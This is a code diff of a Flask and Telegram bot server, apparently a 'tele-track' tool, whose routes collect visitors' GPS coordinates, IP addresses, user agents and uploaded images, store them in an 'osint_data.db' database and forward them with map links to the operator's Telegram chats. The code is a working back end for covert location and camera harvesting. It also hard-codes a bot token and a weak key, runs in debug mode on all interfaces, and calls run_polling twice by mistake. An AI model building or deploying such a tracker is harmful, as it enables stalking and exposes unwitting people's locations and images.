@@ -1,22 +1,15 @@
-from flask import Flask, request, jsonify, send_file
-from flask_httpauth import HTTPBasicAuth
-import sqlite3
-from datetime import datetime
 import os
-import traceback
+import sqlite3
+import threading
+from datetime import datetime
+from flask import Flask, request, jsonify, send_file
+from telegram import Update
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 import requests
-from telegram import Bot, Update
-from telegram.ext import Application, CommandHandler, ContextTypes
 import asyncio
 
 # -------------------- Flask Setup --------------------
 app = Flask(__name__)
-auth = HTTPBasicAuth()
-users = {"admin": "pass123"}
-
-@auth.verify_password
-def verify_password(username, password):
-    return username if username in users and users[username] == password else None
 
 # -------------------- Folder Setup --------------------
 SAVE_FOLDER = "saved_files"
@@ -42,24 +35,35 @@ def init_db():
 init_db()
 
 # -------------------- Telegram Bot Setup --------------------
-
-
-TELEGRAM_BOT_TOKEN = "123456789:ABCdefGHIjkl-MNO_pqrSTUvwxYZ12345678"
-AUTHORIZED_KEY = "ztrack577802"
-
-bot = Bot(token=TELEGRAM_BOT_TOKEN)
-application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-
+TELEGRAM_BOT_TOKEN = "8068204110:AAELqo2Dres3tX5pvlC5O2wopyqFwaP2AM0"  # Replace with your actual bot token
+AUTHORIZED_KEY = "secretkey123"  # Your auth key for users
 authenticated_users = set()
 
+def send_telegram_message(message):
+    for user_id in authenticated_users:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {
+            "chat_id": user_id,
+            "text": message,
+            "parse_mode": "Markdown"
+        }
+        requests.post(url, data=data)
 
-# -------------------- Telegram Handlers --------------------
+def send_telegram_image(image_path, caption=""):
+    for user_id in authenticated_users:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
+        with open(image_path, "rb") as photo:
+            files = {"photo": photo}
+            data = {"chat_id": user_id, "caption": caption}
+            requests.post(url, files=files, data=data)
+
+# Telegram Command Handlers
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in authenticated_users:
         await update.message.reply_text("🔒 Please authenticate using /auth <key>")
         return
-    await update.message.reply_text("✅ Server is live!")
+    await update.message.reply_text("✅ Server is live and bot is running!")
 
 async def auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -96,60 +100,70 @@ async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(f"🗑️ Deleted {deleted_files} image(s) and cleared database.")
 
-# Register handlers
-application.add_handler(CommandHandler("start", start))
-application.add_handler(CommandHandler("auth", auth))
-application.add_handler(CommandHandler("chatid", chatid))
-application.add_handler(CommandHandler("delete", delete))
+def run_bot():
+    try:
+        # Create and set a new event loop for this thread
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
 
-# -------------------- Telegram Message Utilities --------------------
-def send_telegram_message(message):
-    for user_id in authenticated_users:
-        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", data={
-            "chat_id": user_id,
-            "text": message,
-            "parse_mode": "Markdown"
-        })
+        application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
 
-def send_telegram_image(image_path, caption=""):
-    for user_id in authenticated_users:
-        with open(image_path, "rb") as photo:
-            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto", data={
-                "chat_id": user_id,
-                "caption": caption
-            }, files={"photo": photo})
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("auth", auth))
+        application.add_handler(CommandHandler("chatid", chatid))
+        application.add_handler(CommandHandler("delete", delete))
+
+        # Run polling with the newly set event loop
+        application.run_polling()
+    except Exception as e:
+        print(f"[❌] Bot failed to start: {e}")
+        import traceback
+        traceback.print_exc()
+
+    application.run_polling()
 
 # -------------------- Flask Routes --------------------
 @app.route('/')
 def index():
+    # Serve your frontend page if you have one
     return send_file('static/index.html')
 
 @app.route('/location', methods=['POST'])
 def receive_location():
     data = request.get_json()
-    ip_address = request.remote_addr
-    user_agent = request.headers.get('User-Agent')
+    ip_address = request.remote_addr or "Unknown IP"
+    user_agent = request.headers.get('User-Agent', 'Unknown User Agent')
 
+    lat = data.get('latitude')
+    lon = data.get('longitude')
+    accuracy = data.get('accuracy', 'Unknown')
+
+    # Save to DB
     conn = sqlite3.connect('osint_data.db')
     c = conn.cursor()
-    c.execute("""INSERT INTO osint_data
-                 (type, latitude, longitude, accuracy, timestamp, ip_address, user_agent)
-                 VALUES (?, ?, ?, ?, ?, ?, ?)""",
-              ("location", data['latitude'], data['longitude'], data['accuracy'],
-               datetime.utcnow().isoformat(), ip_address, user_agent))
+    c.execute('''
+        INSERT INTO osint_data (type, latitude, longitude, accuracy, timestamp, ip_address, user_agent)
+        VALUES (?, ?, ?, ?, ?, ?, ?)
+    ''', ("location", lat, lon, accuracy, datetime.utcnow().isoformat(), ip_address, user_agent))
     conn.commit()
     conn.close()
 
-    msg = (
-        "📍 *New Location Received:*\n"
-        f"Latitude: `{data['latitude']}`\n"
-        f"Longitude: `{data['longitude']}`\n"
-        f"Accuracy: ±{data['accuracy']} m\n"
-        f"[📍 View on Map](https://www.google.com/maps?q={data['latitude']},{data['longitude']})\n"
+    # Prepare message for Telegram (vertical new lines and clickable map)
+    message = (
+        f"📍 *New Location Received:*\n"
+        f"Latitude: `{lat}`\n"
+        f"Longitude: `{lon}`\n"
+        f"Accuracy: ±{accuracy} m\n"
+        f"[📍 View on Map](https://www.google.com/maps?q={lat},{lon})\n"
         f"IP: `{ip_address}`\n"
-        f"UA: `{user_agent}`"
+        f"User Agent: `{user_agent}`"
     )
-    send_telegram_message(msg)
+
+    # Send to Telegram
+    send_telegram_message(message)
+
+    # Print to console
+    print(f"[Location] IP: {ip_address}, UA: {user_agent}, Coordinates: ({lat}, {lon}), Accuracy: {accuracy}")
 
     return jsonify({"status": "OK"}), 200
 
@@ -165,35 +179,24 @@ def upload_image():
 
     conn = sqlite3.connect('osint_data.db')
     c = conn.cursor()
-    c.execute("""INSERT INTO osint_data (type, file_path, timestamp)
-                 VALUES (?, ?, ?)""",
-              ("image", filename, datetime.utcnow().isoformat()))
+    c.execute('''
+        INSERT INTO osint_data (type, file_path, timestamp)
+        VALUES (?, ?, ?)
+    ''', ("image", filename, datetime.utcnow().isoformat()))
     conn.commit()
     conn.close()
 
     send_telegram_image(filename, caption="🖼️ New Image Uploaded")
 
+    print(f"[Image] Saved and sent: {filename}")
+
     return jsonify({"status": "OK"}), 200
 
-# -------------------- Telegram Webhook Route --------------------
-@app.route('/webhook', methods=['POST'])
-def telegram_webhook():
-    if request.method == "POST":
-        update = Update.de_json(request.get_json(force=True), bot)
-        
-        async def process():
-            await application.initialize()  # <== REQUIRED!
-            await application.process_update(update)
+# -------------------- Main --------------------
+if __name__ == '__main__':
+    # Start Telegram bot polling in a separate thread
+    threading.Thread(target=run_bot, daemon=True).start()
 
-        asyncio.run(process())
-
-        return "OK", 200
-    print(f"Received update: {update}")
-
-# -------------------- Set Webhook Manually --------------------
-@app.route('/set_webhook')
-def set_webhook():
-    webhook_url = "https://tele-track-syk8.onrender.com/webhook"
-    result = bot.set_webhook(webhook_url)
-    return f"Webhook set: {result}"
-
+    # Start Flask app
+    print("🚀 Starting Flask server on http://0.0.0.0:5000")
+    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
